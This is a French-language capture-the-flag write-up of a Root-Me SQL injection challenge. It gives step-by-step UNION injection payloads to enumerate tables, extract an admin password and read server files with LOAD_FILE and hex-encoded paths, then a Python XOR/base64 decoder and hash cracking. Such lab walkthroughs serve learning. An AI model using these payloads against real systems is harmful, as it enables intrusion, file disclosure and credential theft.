# CTF-SQLI : READ FILE

On arrive sur le chall et on trouve une page avec un url intéressant 

[http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1](http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1)

On test un peu : id=-1 union select version()

Et on obtient un message d’erreur d’un nombre de colonne différent. Penser à tester le     -1 pour pas que la page renvoie un truc valide.

Pour voir le nombre de colonnes :

id=1 order by 4

On test la version : id=-1%20union%20select%201,@@version,3,4

Résultat : 10.3.39-MariaDB-0ubuntu0.20.04.2

On cherche maintenant le nom de la table et tout ce qui s’en suit :

id=-1 union select table_name,2,3,4 from information_schema.tables where table_schema=database() limit 1 offset 0  

Résultat : member

Le nom des colonnes :

id=-1 union select column_name,2,3,4 from information_schema.columns where table_name=CHAR(109,101,109,98,101,114) limit 2 offset  0

La function CHAR(109,101,109,98,101,114) est super utile lorsqu’on a besoin d’écrire un mot sans ‘’.

Résultat : member_id/member_login/member_password/member_email

Je récupère le password :

 id=-1 union select member_password,2,3,4 from member where member_login=CHAR(97,100,109,105,110) limit 2 offset  0  
  
Mais Malheur !! Le MDP est chiffré : VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==

Le chall s’appelle load file et je n’ai pas encore touché à un seul fichier, il y a donc surement une autre faille.

Apparement dans presque tout les challs le dossier est dans 

/challenge/web-serveur/ch31/index.php

Donc on va la lire comme ca :

id=-1 union select LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4

Toujours pas de ‘’ donc on le met en hexa :

![[SQLI_LoadFile_01_d6d59ab2a8.png]]

Bon on ne voit pas tout ici donc on inspect

![[SQLI_LoadFile_02_f47d1ac1c1.png]]

Génial, on a trouvé la clé de décodage. Avec l’aide du chat on voit que il y a du xor et en base 64 donc on lui demande un algo pour nous le décoder et voila :

import base64

# 1. La clé trouvée dans le code source

key = "c92fcd618967933ac463feb85ba00d5a7ae52842"

# 2. Le mot de passe chiffré extrait de la BDD

db_password_b64 = "VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=="

# 3. Décodage Base64

db_password_bytes = base64.b64decode(db_password_b64)

# 4. Fonction XOR (simulée comme en PHP)

result_hash = ""

for i in range(len(key)):

    # On prend le code ASCII du caractère de la clé

    char_code_key = ord(key[i])

    

    # On prend l'octet correspondant dans le mdp décodé

    # (On gère le cas où la longueur différerait légèrement)

    if i < len(db_password_bytes):

        byte_pass = db_password_bytes[i]

    else:

        byte_pass = 0

        

    # On fait le XOR et on convertit en caractère

    result_hash += chr(char_code_key ^ byte_pass)

print("Le Hash SHA1 à cracker est :")

print(result_hash)

Le code nous renvoi ca : 77be4fc97f77f5f48308942bb6e32aacabed9cef 

Apparemment c’est bon car ca commence par 77 et maintenant on le donne a crackstation.net et il nous renvoi le mdp : superpassword
